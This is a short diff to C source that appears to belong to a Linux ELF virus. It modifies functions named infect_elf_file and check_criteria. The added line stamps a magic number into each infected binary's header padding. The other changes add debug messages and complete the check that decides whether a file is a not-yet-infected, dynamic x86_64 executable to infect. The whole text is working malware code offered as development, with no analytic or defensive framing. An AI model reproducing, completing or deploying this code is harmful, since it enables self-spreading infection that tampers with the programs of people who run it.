@@ -306,6 +306,7 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	paddingSize = PAGE_ALIGN_UP(parasiteSize + JMPCODE_LEN);
 	
 	mem = target->mem;
+	*(uint32_t *)&mem[EI_PAD] = MAGIC_NUMBER;
 	ehdr = (Elf64_Ehdr *)target->ehdr;
 	phdr = (Elf64_Phdr *)target->phdr;
 	shdr = (Elf64_Shdr *)target->shdr;
@@ -439,18 +440,27 @@ int check_criteria(char *filename)
 	_close(fd);
 	ehdr = (Elf64_Ehdr *)mem;
 	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
-	if(_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0)
+	if(_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0) {
+		DEBUG_PRINT("not an ELF\n");
 		return -1;
+	}
 	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
-	if (magic == MAGIC_NUMBER) //already infected? Then skip this file
+	if (magic == MAGIC_NUMBER) { //already infected? Then skip this file
+		DEBUG_PRINT("is infected\n");
 		return -1;
-	if (ehdr->e_machine != EM_X86_64)
+	}
+	if (ehdr->e_machine != EM_X86_64) {
+		DEBUG_PRINT("not x86_64\n");
 		return -1;
+	}
 	for (dynamic = 0, i = 0; i < ehdr->e_phnum; i++) 
 		if (phdr[i].p_type == PT_DYNAMIC)	
 			dynamic++;
-	if (!dynamic) 
+	if (!dynamic) {
+		DEBUG_PRINT("not dynamic\n");
 		return -1;
+	}
+	return 0;
 
 }
 void do_main(struct bootstrap_data *bootstrap)
